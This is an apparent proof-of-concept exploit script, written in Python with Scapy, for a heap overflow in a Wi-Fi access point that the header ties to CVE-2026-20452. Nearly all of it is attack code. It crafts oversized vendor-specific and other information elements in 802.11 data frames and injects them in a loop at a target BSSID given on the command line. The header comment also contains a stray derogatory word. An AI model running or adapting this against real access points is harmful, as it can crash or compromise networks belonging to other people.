# was assigned CVE-2026-20452, gay

import argparse
import sys
import time
from scapy.all import RadioTap, Dot11, Dot11QoS, Raw, sendp, conf

def craft_overflow_frame(bssid, attacker_mac, overflow_size=512, variant=0):
    dot11 = Dot11(
        type=2,
        subtype=8,
        addr1=bssid,
        addr2=attacker_mac,
        addr3=bssid,
        FCfield="to-DS",
    )

    if variant == 0:
        ie_type = 221
        oui = b"\x00\x50\x43"
        ie_value = oui + b"\x42" * (overflow_size - 3)
        ie = bytes([ie_type, min(overflow_size, 255)]) + ie_value[:252]
    elif variant == 1:
        ie = b""
        for i in range(overflow_size // 32):
            ie += bytes([221, 28]) + b"\x00\x50\x43" + b"\x41" * 25
        ie += bytes([0, 0])
    elif variant == 2:
        ie_type = 45
        ie = bytes([ie_type, min(overflow_size, 255)]) + b"\x43" * min(overflow_size - 2, 253)
    else:
        ie_type = 127
        ie = bytes([ie_type, min(overflow_size, 255)]) + b"\xff" * min(overflow_size - 2, 253)

    qos = Raw(load=b"\x00\x00")
    payload = Raw(load=ie)

    frame = RadioTap() / dot11 / qos / payload
    return frame


def validate_mac(mac_str):
    try:
        parts = mac_str.split(":")
        if len(parts) != 6:
            return False
        for p in parts:
            int(p, 16)
        return True
    except ValueError:
        return False


def main():
    parser = argparse.ArgumentParser(description="WLAN AP Heap Overflow")
    parser.add_argument("--interface", required=True, help="Monitor-mode Wi-Fi interface")
    parser.add_argument("--bssid", required=True, help="Target AP BSSID")
    parser.add_argument("--attacker", required=True, help="Attacker MAC")

    args = parser.parse_args()

    if not validate_mac(args.bssid):
        print(f"Invalid BSSID: {args.bssid}")
        sys.exit(1)
    if not validate_mac(args.attacker):
        print(f"Invalid attacker MAC: {args.attacker}")
        sys.exit(1)

    overflow_size = 768
    variant = 0
    count = 25
    delay = 0.05

    print(f"Target BSSID: {args.bssid}")
    print(f"Attacker MAC: {args.attacker}")
    print(f"Interface: {args.interface}")
    print(f"Overflow size: {overflow_size} bytes")
    print(f"Frames: {count}")
    print()

    conf.verb = 0

    for i in range(count):
        frame = craft_overflow_frame(
            bssid=args.bssid,
            attacker_mac=args.attacker,
            overflow_size=overflow_size,
            variant=variant,
        )

        try:
            sendp(frame, iface=args.interface, verbose=False)
            print(f"  Frame {i+1}/{count} injected")
        except Exception as e:
            print(f"  Frame {i+1}/{count} failed: {e}")
            break

        if i < count - 1:
            time.sleep(delay)

if __name__ == "__main__":
    main()